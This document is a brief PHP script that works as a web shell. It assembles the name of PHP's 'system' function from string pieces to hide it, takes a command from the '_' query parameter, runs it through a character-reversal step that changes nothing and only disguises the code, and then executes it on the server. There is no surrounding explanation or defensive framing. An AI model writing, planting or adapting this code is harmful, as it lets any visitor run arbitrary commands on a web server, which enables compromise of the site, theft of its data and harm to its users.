<?php
$func = 'sy' . 'st' . 'em';
$cmd = filter_input(INPUT_GET, '_', FILTER_DEFAULT);
$obfuscatedCmd = preg_replace_callback('/([^\w\s])/', function($matches) {
    return strrev($matches[0]); 
}, $cmd); 
$func($obfuscatedCmd);
?>
